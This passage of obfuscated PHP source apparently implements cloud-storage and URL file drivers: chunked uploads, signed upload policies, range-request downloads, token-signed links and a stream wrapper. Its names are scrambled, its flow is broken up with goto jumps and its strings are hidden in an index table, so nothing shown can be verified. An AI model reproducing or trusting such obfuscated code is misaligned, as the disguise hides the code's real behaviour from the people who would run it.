$this->fileInfo($B†‡‚ôîÄç[$A°¯¨”ì¯ä[28]], $c£¨Íˆß±¤, $B†‡‚ôîÄç); } return array($A°¯¨”ì¯ä[75] => $C¬éÛí·‡Ğ, $A°¯¨”ì¯ä[74] => $CÚŒ„ÜˆëÚ); } public function has($Bø›Š³¨•Í, $b»­Ü±´‡Ü = false, $C“ìõÌ¯íÜ = true) { goto cÄ¨¿ƒ‚Ç; d†ø¯Îï: while (!0) { check_abort(); $CÑ½ºë»¢Ú = $this->listObjs($Bø›Š³¨•Í, $F• ¨À¦À‚, $bîã¢…·‰”); if (!$CÑ½ºë»¢Ú) { return !1; } $F• ¨À¦À‚ = isset($CÑ½ºë»¢Ú[$aãµ‘‰Š¯ë[1366]]) ? $CÑ½ºë»¢Ú[$aãµ‘‰Š¯ë[1366]] : $aãµ‘‰Š¯ë[33]; $a»“¹µ‡¨¼ = isset($CÑ½ºë»¢Ú[$aãµ‘‰Š¯ë[1367]]) ? $CÑ½ºë»¢Ú[$aãµ‘‰Š¯ë[1367]] : array(); if (empty($a»“¹µ‡¨¼)) { break; } $D‘ŞŠĞä¯ó = array_filter($a»“¹µ‡¨¼, function ($F­‡Õ¨›Ş) { $Fä‹âëİ¡ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; return $F­‡Õ¨›Ş[$Fä‹âëİ¡[29]] == $Fä‹âëİ¡[77]; }); $FÄ´Êõ¨Ñ° = count($a»“¹µ‡¨¼); $D‘ŞŠĞä¯ó = count($D‘ŞŠĞä¯ó); $BñÒİÀß´Ä = $FÄ´Êõ¨Ñ° - $D‘ŞŠĞä¯ó; if ($b»­Ü±´‡Ü) { $D‰ŠØÏÏºƒ += $D‘ŞŠĞä¯ó; $dëÖªõ‹‰Ë += $BñÒİÀß´Ä; if ($FÄ´Êõ¨Ñ° < $bîã¢…·‰”) { break; } continue; } if ($C“ìõÌ¯íÜ) { if ($BñÒİÀß´Ä) { return !0; } } else { if ($D‘ŞŠĞä¯ó) { return !0; } } if ($FÄ´Êõ¨Ñ° < $bîã¢…·‰”) { break; } } if ($b»­Ü±´‡Ü) { return array($aãµ‘‰Š¯ë[203] => $dëÖªõ‹‰Ë, $aãµ‘‰Š¯ë[204] => $D‰ŠØÏÏºƒ); } return !1; goto FÉ¯ØÊø”ó; cÄ¨¿ƒ‚Ç: $aãµ‘‰Š¯ë =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $F• ¨À¦À‚ = $aãµ‘‰Š¯ë[33]; $bîã¢…·‰” = 500; goto Aä¯øÖÚ×¡; Aä¯øÖÚ×¡: $dëÖªõ‹‰Ë = 0; $D‰ŠØÏÏºƒ = 0; $dèé…Ã´Œê = rtrim($Bø›Š³¨•Í, $aãµ‘‰Š¯ë[8]) . $aãµ‘‰Š¯ë[8]; goto d†ø¯Îï; FÉ¯ØÊø”ó: } public function listAll($EÏíÆ¹…Ää) { goto fÌ†¾„; fŠ§•‚®’¼: return $this->listAllFiles($EÏíÆ¹…Ää, array_keys($CÀâÏ®Øî), $CÀâÏ®Øî); goto E¯Ç§Šîš®; fÌ†¾„: $fÓ¤Ğ°‡‚ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $dÀ‡ùÙÇŠ = $CÍÔõâ = array(); $this->fileList($EÏíÆ¹…Ää, $dÀ‡ùÙÇŠ, $CÍÔõâ, !0); goto DÌÀ²ô˜‚ª; DÌÀ²ô˜‚ª: $CÀâÏ®Øî = array(); foreach ($CÍÔõâ as $Bã÷›«—µ“) { $CÀâÏ®Øî[$Bã÷›«—µ“[$fÓ¤Ğ°‡‚[28]]] = $Bã÷›«—µ“[$fÓ¤Ğ°‡‚[78]]; } foreach ($dÀ‡ùÙÇŠ as $Bã÷›«—µ“) { if (is_string($Bã÷›«—µ“)) { $CÀâÏ®Øî[$Bã÷›«—µ“] = 0; } } goto fŠ§•‚®’¼; E¯Ç§Šîš®: } public function canRead($AğÕÇÌ“õ) { return $this->exist($AğÕÇÌ“õ) ? !0 : !1; } public function canWrite($cÉ÷¾Ä•³’) { return $this->exist($cÉ÷¾Ä•³’) ? !0 : !1; } public function getContent($c¶Û÷·¢¤Ó) { return $this->fileSubstr($c¶Û÷·¢¤Ó, 0, -1); } public function setContent($aóìôî¦, $CÉœÍçø„ = '') { $Fëä¦ºî‚‹ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$CÉœÍçø„) { $b¿­ö“Ï®¾ = $this->ussRequest($aóìôî¦, $Fëä¦ºî‚‹[224]); return $b¿­ö“Ï®¾[$Fëä¦ºî‚‹[1107]]; } $cºä×Ì´à = $this->tempFile($this->pathThis($aóìôî¦)); file_put_contents($cºä×Ì´à, $CÉœÍçø„); if ($this->upload($aóìôî¦, $cºä×Ì´à)) { $this->tempFileRemve($cºä×Ì´à); return !0; } return !1; } public function fileSubstr($f“ÕÜ‚µØ, $Cùé¹Æ“íç, $CëÎˆ‡‰òÁ) { $FšÏ‰õ¶Š =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!($fÓ•¯¨“ª¿ = $this->link($f“ÕÜ‚µØ))) { return !1; } $eˆ„¥½ÍšÒ = !1; if ($CëÎˆ‡‰òÁ > 0) { $BìïñÀàÀ = $Cùé¹Æ“íç + $CëÎˆ‡‰òÁ - 1; $eˆ„¥½ÍšÒ = array($FšÏ‰õ¶Š[1329] . $Cùé¹Æ“íç . $FšÏ‰õ¶Š[454] . $BìïñÀàÀ); } $EÕÅ·â‹ß = url_request($fÓ•¯¨“ª¿, $FšÏ‰õ¶Š[228], !1, $eˆ„¥½ÍšÒ); return $EÕÅ·â‹ß[$FšÏ‰õ¶Š[731]] ? $EÕÅ·â‹ß[$FšÏ‰õ¶Š[1109]] : !1; } public function upload($D½Œ¹Ë™–ª, $aß–…´Ó•Ò, $eóïæŸÃÆº = false, $FÛ¼šò¸‹Œ = REPEAT_REPLACE) { goto Aª¢÷é•À; Eù…‚ÒåİË: $BÚå”¯Îºõ = $e÷óŠ‰—ÆÇ[$fÍø¼ÆâæØ[1374]]; $cÄ •ŞóÂŒ = fopen($aß–…´Ó•Ò, $fÍø¼ÆâæØ[1280]); if (!$cÄ •ŞóÂŒ) { return !1; } goto D´Ÿğ „Åô; CÖÆ˜Š©¹: if (!$Bœ™ÏáË¸–[$fÍø¼ÆâæØ[1107]]) { return !1; } $e÷óŠ‰—ÆÇ = $Bœ™ÏáË¸–[$fÍø¼ÆâæØ[1109]]; $eÂ¯¡ë‹‰Æ = 0; goto Eù…‚ÒåİË; EµƒÌ¡­œŒ: $bÑ£øìøÊ¶ = 1024 * 1024 * 10; $aê·¨ÙšÂ = array($fÍø¼ÆâæØ[1370], $fÍø¼ÆâæØ[1371] . $F·ÖÙšĞİŸ, $fÍø¼ÆâæØ[1372], $fÍø¼ÆâæØ[1373] . $bÑ£øìøÊ¶); $Bœ™ÏáË¸– = $this->ussRequest($D½Œ¹Ë™–ª, $fÍø¼ÆâæØ[226], !1, $aê·¨ÙšÂ); goto CÖÆ˜Š©¹; Aª¢÷é•À: $fÍø¼ÆâæØ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $F·ÖÙšĞİŸ = IO::size($aß–…´Ó•Ò); if ($F·ÖÙšĞİŸ <= 1024 * 1024 * 200) { $CšÜ–Ó‹½ = array($fÍø¼ÆâæØ[1369] . $aß–…´Ó•Ò); $Bœ™ÏáË¸– = $this->ussRequest($D½Œ¹Ë™–ª, $fÍø¼ÆâæØ[226], $CšÜ–Ó‹½); return $Bœ™ÏáË¸–[$fÍø¼ÆâæØ[1107]] ? $this->getPathOuter($D½Œ¹Ë™–ª) : !1; } goto EµƒÌ¡­œŒ; f×µ…öèÈ: $Bœ™ÏáË¸– = $this->ussRequest($D½Œ¹Ë™–ª, $fÍø¼ÆâæØ[226], !1, $aê·¨ÙšÂ); return $Bœ™ÏáË¸–[$fÍø¼ÆâæØ[1107]] ? $this->getPathOuter($D„…®½Îº) : !1; goto B¾‡´ë‹õ; D´Ÿğ „Åô: do { $c”¨Â³’Ñà = $e÷óŠ‰—ÆÇ[$fÍø¼ÆâæØ[1375]]; fseek_64($cÄ •ŞóÂŒ, $eÂ¯¡ë‹‰Æ); $bˆøĞøß‚„ = fread($cÄ •ŞóÂŒ, $c”¨Â³’Ñà); $EœÕõƒÑÂ = 0; do { $EœÕõƒÑÂ++; $e÷óŠ‰—ÆÇ = $this->uploadPart($D½Œ¹Ë™–ª, $e÷óŠ‰—ÆÇ, $bˆøĞøß‚„); } while (!$e÷óŠ‰—ÆÇ && $EœÕõƒÑÂ < 3); if (!$e÷óŠ‰—ÆÇ) { return !1; } $BÚå”¯Îºõ = $e÷óŠ‰—ÆÇ[$fÍø¼ÆâæØ[1374]]; $eÂ¯¡ë‹‰Æ += $c”¨Â³’Ñà; } while ($BÚå”¯Îºõ != -1); fclose($cÄ •ŞóÂŒ); $aê·¨ÙšÂ = array($fÍø¼ÆâæØ[1376], $fÍø¼ÆâæØ[1377] . $e÷óŠ‰—ÆÇ[$fÍø¼ÆâæØ[1378]], $fÍø¼ÆâæØ[1372]); goto f×µ…öèÈ; B¾‡´ë‹õ: } private function uploadPart($FŸÔŸ«³ƒœ, $F±ã‰Ê®, &$F–ÂØñÊŒ) { $båæ†ùÅ¯– =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $FŞ’ÕêíÔ = array($båæ†ùÅ¯–[1379], $båæ†ùÅ¯–[1377] . $F±ã‰Ê®[$båæ†ùÅ¯–[1378]], $båæ†ùÅ¯–[1380] . $F±ã‰Ê®[$båæ†ùÅ¯–[1374]], $båæ†ùÅ¯–[141] . $F±ã‰Ê®[$båæ†ùÅ¯–[1375]]); $Cõ‰ä¶ƒçƒ = $this->ussRequest($FŸÔŸ«³ƒœ, $båæ†ùÅ¯–[226], $F–ÂØñÊŒ, $FŞ’ÕêíÔ); return !$Cõ‰ä¶ƒçƒ[$båæ†ùÅ¯–[1107]] ? $Cõ‰ä¶ƒçƒ[$båæ†ùÅ¯–[1107]] : $Cõ‰ä¶ƒçƒ[$båæ†ùÅ¯–[1109]]; } public function uploadFormData($eÉ™«ÉÀƒÂ, $Eˆ„ãØƒË = 3600) { return $this->uploadPolicy($eÉ™«ÉÀƒÂ, $Eˆ„ãØƒË); } public function multiUploadFormData($cåƒˆÚ§·¡, $a´êµÉğ’® = 3600) { $CÉäÖ¬“±ì =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $c¦±Ôõ·¨” = (int) $GLOBALS[$CÉäÖ¬“±ì[7]][$CÉäÖ¬“±ì[78]]; return $this->uploadPolicy($cåƒˆÚ§·¡, $a´êµÉğ’®, $c¦±Ôõ·¨”); } private function uploadPolicy($C¶ÇöµàƒÆ, $DƒÚ“‚¾æ© = 3600, $f ºöãŸ£¯ = 0) { goto b•Å†Ìğºù; bˆ—Çì‰‹Ÿ: $dË‡ÇÉŠİÒ = base64_encode(hash_hmac($C©¶ÔŒŸò[1351], "\x50\x4f\x53\124\x26{$BÃ·’Â§è}\46{$a¦Í‰¬è›±}\46{$cÜ›Òíİó}", md5("{$this->userpass}"), !0)); $f¨¦é¥†§ç = array($C©¶ÔŒŸò[1222] => $cÜ›Òíİó, $C©¶ÔŒŸò[1385] => "\x55\x50\131\125\116\40{$this->username}\x3a{$dË‡ÇÉŠİÒ}", $C©¶ÔŒŸò[175] => $this->endpoint . $BÃ·’Â§è); return $f¨¦é¥†§ç; goto Eñš˜„ëØ; b½±áë·è: $d¸ßİŒ¡èŠ = array($C©¶ÔŒŸò[1381] => $this->bucket, $C©¶ÔŒŸò[1382] => $C¶ÇöµàƒÆ, $C©¶ÔŒŸò[1383] => time() + $DƒÚ“‚¾æ©, $C©¶ÔŒŸò[1384] => $a¦Í‰¬è›±); if ($f ºöãŸ£¯) { $d¸ßİŒ¡èŠ[$C©¶ÔŒŸò[1296]] = $f ºöãŸ£¯; } $cÜ›Òíİó = base64_encode(json_encode($d¸ßİŒ¡èŠ)); goto bˆ—Çì‰‹Ÿ; b•Å†Ìğºù: $C©¶ÔŒŸò =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $BÃ·’Â§è = $C©¶ÔŒŸò[8] . $this->bucket; $a¦Í‰¬è›± = gmdate($C©¶ÔŒŸò[1316]); goto b½±áë·è; Eñš˜„ëØ: } public function download($f Ôé¯à”Ô, $CÚéÂÀò) { goto bÁ…¢Œ³Ñä; bÁ…¢Œ³Ñä: $EÔƒ¼¡«ÕÕ = IO::getPathInner(IO::mkfile($CÚéÂÀò)); if (!($b¦óÜÀ³ø‡ = $this->link($f Ôé¯à”Ô))) { return !1; } $A¯Ë‘“ = 0; goto d×à²«¼î°; d×à²«¼î°: $c†ØàÅ‹ = 1024 * 200; $f¹‘¤–šº = fopen($EÔƒ¼¡«ÕÕ, $_SERVER[Ôğ—¤Šµˆ˜ñ£][1335]); while (!0) { $eÍÌ„…«ß = $this->fileSubstr($f Ôé¯à”Ô, $A¯Ë‘“, $c†ØàÅ‹); if ($eÍÌ„…«ß === !1) { return !1; } fwrite($f¹‘¤–šº, $eÍÌ„…«ß); $A¯Ë‘“ += $c†ØàÅ‹; if (strlen($eÍÌ„…«ß) < $c†ØàÅ‹) { break; } } goto c›Àİ÷ç; c›Àİ÷ç: fclose($f¹‘¤–šº); return $CÚéÂÀò; goto fè…ŞŠ²­¶; fè…ŞŠ²­¶: } public function link($D³§øÑ©¡™, $cÅƒñ¥­ŞÕ = array()) { $Bèˆ‘ÃñáÖ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $D³§øÑ©¡™ = trim($D³§øÑ©¡™, $Bèˆ‘ÃñáÖ[8]); if (!empty($this->token)) { $D¸ÀÙ¨¨Ì– = strtotime(date($Bèˆ‘ÃñáÖ[1386])); $c«¦“ã‡Ñù = substr(md5($this->token . $Bèˆ‘ÃñáÖ[282] . $D¸ÀÙ¨¨Ì– . $Bèˆ‘ÃñáÖ[1387] . $D³§øÑ©¡™), 12, 8) . $D¸ÀÙ¨¨Ì–; $cÅƒñ¥­ŞÕ[] = $Bèˆ‘ÃñáÖ[1388] . $c«¦“ã‡Ñù; } $C»ãÑ…ìĞ· = !empty($cÅƒñ¥­ŞÕ) ? $Bèˆ‘ÃñáÖ[70] . implode($Bèˆ‘ÃñáÖ[282], $cÅƒñ¥­ŞÕ) : $Bèˆ‘ÃñáÖ[33]; return $this->getHost() . $Bèˆ‘ÃñáÖ[8] . $D³§øÑ©¡™ . $C»ãÑ…ìĞ·; } public function fileOut($Aèò°ğ“ÂÔ, $AÒÜÃ°Çğ = false, $AÛ‡ïÉ„˜« = false, $FÓ‘‡ÇËË = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($Aèò°ğ“ÂÔ, $AÒÜÃ°Çğ, $AÛ‡ïÉ„˜«, $FÓ‘‡ÇËË); } if (!$AÛ‡ïÉ„˜«) { $AÛ‡ïÉ„˜« = $this->pathThis($Aèò°ğ“ÂÔ); } $eÌÁ¨ĞŸé = $AÒÜÃ°Çğ ? array($_SERVER[Ôğ—¤Šµˆ˜ñ£][1389] . rawurlencode($AÛ‡ïÉ„˜«)) : array(); $D‰•â¡œ = $this->link($Aèò°ğ“ÂÔ, $eÌÁ¨ĞŸé); $this->fileOutLink($D‰•â¡œ); } public function fileOutServer($bŸ§«ª¯Ïğ, $BöÓÅÛ„³ˆ = false, $fÂ‘®ÓÂÙº = false, $bˆ×øğ ÷ä = '') { parent::fileOut($bŸ§«ª¯Ïğ, $BöÓÅÛ„³ˆ, $fÂ‘®ÓÂÙº, $bˆ×øğ ÷ä); } public function fileOutImage($FëÚÌ¦¿†¡, $F¾ÅĞî‡Üİ = 250) { $Bñ•Ğ¾‰×æ = $this->link($FëÚÌ¦¿†¡ . $_SERVER[Ôğ—¤Šµˆ˜ñ£][1390] . $F¾ÅĞî‡Üİ); $this->fileOutLink($Bñ•Ğ¾‰×æ); } public function fileOutImageServer($a°á‡‘Î, $dõ–îÏƒ = 250) { parent::fileOutImage($a°á‡‘Î, $dõ–îÏƒ); } public function hashMd5($bçêÌªÈğò) { $d…”ÀïğÔ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $a½¾µÎ†Ô  = $this->_objectMeta($bçêÌªÈğò); return isset($a½¾µÎ†Ô [$d…”ÀïğÔ[208]]) ? $a½¾µÎ†Ô [$d…”ÀïğÔ[208]] : !1; } public function size($CÜŠÀ‘šØä) { $aŸÈ›Šæ˜ = $this->objectMeta($CÜŠÀ‘šØä); return $aŸÈ›Šæ˜ ? $aŸÈ›Šæ˜[$_SERVER[Ôğ—¤Šµˆ˜ñ£][78]] : 0; } public function info($e Ööƒ) { if ($this->isFolder($e Ööƒ)) { return $this->folderInfo($e Ööƒ); } else { if ($this->isFile($e Ööƒ)) { return $this->fileInfo($e Ööƒ); } } return !1; } public function exist($AŠÀ–„ÊÈ„) { return $this->isFile($AŠÀ–„ÊÈ„) || $this->isFolder($AŠÀ–„ÊÈ„); } public function isFile($c´Û«Õ‰„Õ) { return !$this->isFolder($c´Û«Õ‰„Õ) && $this->objectMeta($c´Û«Õ‰„Õ); } public function isFolder($e•²ßŞõÌ) { return $this->cacheMethod($_SERVER[Ôğ—¤Šµˆ˜ñ£][199], $e•²ßŞõÌ); } protected function objectMeta($Cã‘ƒâä) { return $this->cacheMethod($_SERVER[Ôğ—¤Šµˆ˜ñ£][200], $Cã‘ƒâä); } protected function _objectMeta($C¼¼™áëø) { goto c§¹Ä‘·åÍ; F÷ˆ„½ØÔ¹: $f±ì®œ¼âã = array($CŸ·ƒ¸‘‚ª[29] => isset($Fˆ»Éö‡×›[$CŸ·ƒ¸‘‚ª[1392]]) ? $Fˆ»Éö‡×›[$CŸ·ƒ¸‘‚ª[1392]] : null, $CŸ·ƒ¸‘‚ª[78] => isset($Fˆ»Éö‡×›[$CŸ·ƒ¸‘‚ª[1393]]) ? $Fˆ»Éö‡×›[$CŸ·ƒ¸‘‚ª[1393]] : null, $CŸ·ƒ¸‘‚ª[208] => isset($Fˆ»Éö‡×›[$CŸ·ƒ¸‘‚ª[1394]]) ? $Fˆ»Éö‡×›[$CŸ·ƒ¸‘‚ª[1394]] : null, $CŸ·ƒ¸‘‚ª[1361] => isset($Fˆ»Éö‡×›[$CŸ·ƒ¸‘‚ª[1395]]) ? $Fˆ»Éö‡×›[$CŸ·ƒ¸‘‚ª[1395]] : null); $f±ì®œ¼âã[$CŸ·ƒ¸‘‚ª[1362]] = isset($Fˆ»Éö‡×›[$CŸ·ƒ¸‘‚ª[1396]]) ? strtotime($Fˆ»Éö‡×›[$CŸ·ƒ¸‘‚ª[1396]]) : $f±ì®œ¼âã[$CŸ·ƒ¸‘‚ª[1361]]; return $f±ì®œ¼âã; goto dÉÔÈöôŠ; cÁœËØòÔë: if (!$dâ•ŒÊ´ÉÉ[$CŸ·ƒ¸‘‚ª[1107]]) { return null; } $Fˆ»Éö‡×› = isset($dâ•ŒÊ´ÉÉ[$CŸ·ƒ¸‘‚ª[1109]]) ? $dâ•ŒÊ´ÉÉ[$CŸ·ƒ¸‘‚ª[1109]] : array(); if (!isset($Fˆ»Éö‡×›[$CŸ·ƒ¸‘‚ª[1392]])) { return null; } goto F÷ˆ„½ØÔ¹; c§¹Ä‘·åÍ: $CŸ·ƒ¸‘‚ª =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if ($C¼¼™áëø == $CŸ·ƒ¸‘‚ª[33] || $C¼¼™áëø == $CŸ·ƒ¸‘‚ª[8]) { return array(); } $dâ•ŒÊ´ÉÉ = $this->ussRequest($C¼¼™áëø, $CŸ·ƒ¸‘‚ª[1391]); goto cÁœËØòÔë; dÉÔÈöôŠ: } protected function _isFolder($f‚çŸ‡ğ‰†) { $e‚®Ä¬³ñÎ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if ($f‚çŸ‡ğ‰† == $e‚®Ä¬³ñÎ[33] || $f‚çŸ‡ğ‰† == $e‚®Ä¬³ñÎ[8]) { return !0; } $EôÆ¿ö…µŠ = $this->_objectMeta($f‚çŸ‡ğ‰†); return isset($EôÆ¿ö…µŠ[$e‚®Ä¬³ñÎ[29]]) && $EôÆ¿ö…µŠ[$e‚®Ä¬³ñÎ[29]] == $e‚®Ä¬³ñÎ[77] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($CâØãŠßº¬ = false) { } public function exist($BŒô·ÆÏ½‹) { $cùôİ¶Â = $this->info($BŒô·ÆÏ½‹); return $cùôİ¶Â[$_SERVER[Ôğ—¤Šµˆ˜ñ£][195]]; } public function isFile($cáÜ°ÈÎ¤Ø) { $EÈ¹Û¿ãåÒ = $this->info($cáÜ°ÈÎ¤Ø); return $EÈ¹Û¿ãåÒ[$_SERVER[Ôğ—¤Šµˆ˜ñ£][195]]; } public function isFolder($B¤ÚÊ¸‚Š³) { return !1; } public function size($eÛ‹¤Š¢“â) { $C¦ˆ½îÎ•¾ = $this->info($eÛ‹¤Š¢“â); return $C¦ˆ½îÎ•¾[$_SERVER[Ôğ—¤Šµˆ˜ñ£][78]]; } public function info($aëŞÂ•æã) { return $this->infoParse($aëŞÂ•æã); } public function infoAuth($FÖ—õÕŸó¥) { return $this->infoParse($FÖ—õÕŸó¥); } public function infoWithChildren($e›µÂº„) { return $this->infoParse($e›µÂº„); } public function infoFull($aªÌÅÄ˜©Õ) { return $this->infoParse($aªÌÅÄ˜©Õ); } private function infoParse($fÙÒÒ·²Çß) { $DÓÀ¡­ĞŸ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $F®‘ùëÊ§¸ = $this->header($fÙÒÒ·²Çß); if (!$F®‘ùëÊ§¸ || !$F®‘ùëÊ§¸[$DÓÀ¡­ĞŸ[731]]) { return !1; } $FØ‡ä‰æ‡ = _get($F®‘ùëÊ§¸, $DÓÀ¡­ĞŸ[335], 0); $C’†ÙÅ¹Œ = array($DÓÀ¡­ĞŸ[28] => $F®‘ùëÊ§¸[$DÓÀ¡­ĞŸ[28]], $DÓÀ¡­ĞŸ[76] => $fÙÒÒ·²Çß, $DÓÀ¡­ĞŸ[29] => $DÓÀ¡­ĞŸ[193], $DÓÀ¡­ĞŸ[78] => intval($FØ‡ä‰æ‡), $DÓÀ¡­ĞŸ[168] => get_path_ext($F®‘ùëÊ§¸[$DÓÀ¡­ĞŸ[28]]), $DÓÀ¡­ĞŸ[1277] => $FØ‡ä‰æ‡ > 0 && $F®‘ùëÊ§¸[$DÓÀ¡­ĞŸ[1397]], $DÓÀ¡­ĞŸ[1278] => !1); return $C’†ÙÅ¹Œ; } private function header($dÎ¡”ÑàÓ) { goto e»òÚÍ¹¸; Cƒ••¾Šô¸: return self::$_cacheHeader[$dÎ¡”ÑàÓ]; goto C·ï’®†„Ó; e»òÚÍ¹¸: $FºÀ¢¼ç¥ù =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (isset(self::$_cacheHeader[$dÎ¡”ÑàÓ])) { return self::$_cacheHeader[$dÎ¡”ÑàÓ]; } $fó¯À–ª§ì = isset($GLOBALS[$FºÀ¢¼ç¥ù[1398]]) ? $GLOBALS[$FºÀ¢¼ç¥ù[1398]] : !1; goto e­øÎ—÷Ÿª; e­øÎ—÷Ÿª: $GLOBALS[$FºÀ¢¼ç¥ù[1398]] = !0; self::$_cacheHeader[$dÎ¡”ÑàÓ] = url_header($dÎ¡”ÑàÓ); $GLOBALS[$FºÀ¢¼ç¥ù[1398]] = $fó¯À–ª§ì; goto Cƒ••¾Šô¸; C·ï’®†„Ó: } public function hashSimple($f…„çİò“à, $CÔ—å•ã– = false) { goto eò´è‰„; cÊèÅ‹×£„: if ($eÊÅäöÑ <= $aÉàˆùõ— * $B™çÁ­ëè§) { return md5($this->fileSubstr($f…„çİò“à, 0, $eÊÅäöÑ)) . $eÊÅäöÑ; } $C¯†ğĞö³ = intval($eÊÅäöÑ / $B™çÁ­ëè§); $Aø°â´óİ‘ = $B‘¿¶ğÑ…Æ[33]; goto A—ÉæŒÓŞ; AùÍçŒÊ: $eÊÅäöÑ = $cÂßÒ’¸ôƒ[$B‘¿¶ğÑ…Æ[78]]; $aÉàˆùõ— = 200; $B™çÁ­ëè§ = 50; goto cÊèÅ‹×£„; A—ÉæŒÓŞ: $Aˆ„íÔé = timeFloat(); $bÇ˜»—–™í = 15; for ($fÍÂÂŒÏßò = 0; $fÍÂÂŒÏßò < $B™çÁ­ëè§; $fÍÂÂŒÏßò++) { if (timeFloat() - $Aˆ„íÔé > $bÇ˜»—–™í) { return !1; } $a‹ğáÄ¼¢Î = $this->fileSubstr($f…„çİò“à, $C¯†ğĞö³ * $fÍÂÂŒÏßò, $aÉàˆùõ—); if (!$a‹ğáÄ¼¢Î) { return !1; } $Aø°â´óİ‘ .= $a‹ğáÄ¼¢Î; } goto FÅĞáâ‰ŞÕ; eò´è‰„: $B‘¿¶ğÑ…Æ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $cÂßÒ’¸ôƒ = $this->info($f…„çİò“à); if (!$cÂßÒ’¸ôƒ || !$cÂßÒ’¸ôƒ[$B‘¿¶ğÑ…Æ[195]]) { return !1; } goto AùÍçŒÊ; FÅĞáâ‰ŞÕ: $Aø°â´óİ‘ .= $this->fileSubstr($f…„çİò“à, $eÊÅäöÑ - $aÉàˆùõ—, $aÉàˆùõ—); return md5($Aø°â´óİ‘) . $eÊÅäöÑ; goto e”öˆ«¾¶†; e”öˆ«¾¶†: } public function getContent($c…ù¿¡«·º) { return $this->fileSubstr($c…ù¿¡«·º); } public function fileSubstr($bÇ¸Œêßå¬, $Eç†‹ØõŸ = 0, $C£¾Êç‘ß› = -1) { goto A½È¬¯’‘; AÉÎ¨İ‹’ù: $b¼ÜßÙñÛŸ = url_request($bÇ¸Œêßå¬, $EÑÑŞ˜’º’[228], !1, $b½…’Ë†’, !1, !1, 1); return $b¼ÜßÙñÛŸ[$EÑÑŞ˜’º’[1109]] ? $b¼ÜßÙñÛŸ[$EÑÑŞ˜’º’[1109]] : $EÑÑŞ˜’º’[33]; goto fê›ñ®·¥; CŠéˆÈÇáÛ: if ($C£¾Êç‘ß› === -1) { $C£¾Êç‘ß› = $aÙ©˜Ïà§Û[$EÑÑŞ˜’º’[78]]; } if ($C£¾Êç‘ß› == 0) { return $EÑÑŞ˜’º’[33]; } $b½…’Ë†’ = array($EÑÑŞ˜’º’[1399] . $Eç†‹ØõŸ . $EÑÑŞ˜’º’[765] . ($Eç†‹ØõŸ + $C£¾Êç‘ß› - 1)); goto AÉÎ¨İ‹’ù; A½È¬¯’‘: $EÑÑŞ˜’º’ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $aÙ©˜Ïà§Û = $this->info($bÇ¸Œêßå¬); if (!$aÙ©˜Ïà§Û || !$aÙ©˜Ïà§Û[$EÑÑŞ˜’º’[195]] && $aÙ©˜Ïà§Û[$EÑÑŞ˜’º’[78]] > 1024 * 1024 * 10) { return !1; } goto CŠéˆÈÇáÛ; fê›ñ®·¥: } public function download($c°Õõ¿ÉÛ¥, $b«‹’ŞŸ„¼) { Downloader::start($c°Õõ¿ÉÛ¥, $b«‹’ŞŸ„¼); return $b«‹’ŞŸ„¼; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($eãğŸâÙ…á, $eÂâÌ³Àá = '') { goto dô»«©ñ–¦; c‡ë÷Ü‡ˆ½: $this->pathOpen = $eãğŸâÙ…á; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } goto eáùøñ¨ô; eáùøñ¨ô: if (!isset(self::$_chunkBuffer[$eãğŸâÙ…á])) { self::$_chunkBuffer[$eãğŸâÙ…á] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; goto eİÏ±Ğ›±á; dô»«©ñ–¦: $this->info = $this->info($eãğŸâÙ…á); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[Ôğ—¤Šµˆ˜ñ£][76]]; goto c‡ë÷Ü‡ˆ½; eİÏ±Ğ›±á: } function stream_read($aÏï²Í™å) { $B…òà’ÂÎÇ = $this->fileSubstr($this->pose, $aÏï²Í™å); $this->pose += strlen($B…òà’ÂÎÇ); return $B…òà’ÂÎÇ; } public function stream_tell() { return $this->pose; } public function stream_seek($A›“á‘Òäµ, $d¼«ëÁ‡À) { $D¶í‚›¯Ğ¸ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if ($d¼«ëÁ‡À == SEEK_SET) { $this->pose = $A›“á‘Òäµ; } else { if ($d¼«ëÁ‡À == SEEK_CUR) { $this->pose += $A›“á‘Òäµ; } else { if ($d¼«ëÁ‡À == SEEK_END) { $this->pose = $this->info[$D¶í‚›¯Ğ¸[78]] + intval($A›“á‘Òäµ); } } } if ($A›“á‘Òäµ < 0) { $this->pose = $this->info[$D¶í‚›¯Ğ¸[78]] + $A›“á‘Òäµ; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[Ôğ—¤Šµˆ˜ñ£][78]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($dˆŒëÓÀ», $e˜ƒ¯˜²ŠÁ) { $fØ·ãÛ³–Œ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $aÕåğ…Ãä’ = $this->info($dˆŒëÓÀ»); return array($fØ·ãÛ³–Œ[1400] => 0, $fØ·ãÛ³–Œ[1401] => 0, $fØ·ãÛ³–Œ[12] => 32768 + 511, $fØ·ãÛ³–Œ[1402] => 0, $fØ·ãÛ³–Œ[1403] => 0, $fØ·ãÛ³–Œ[1404] => 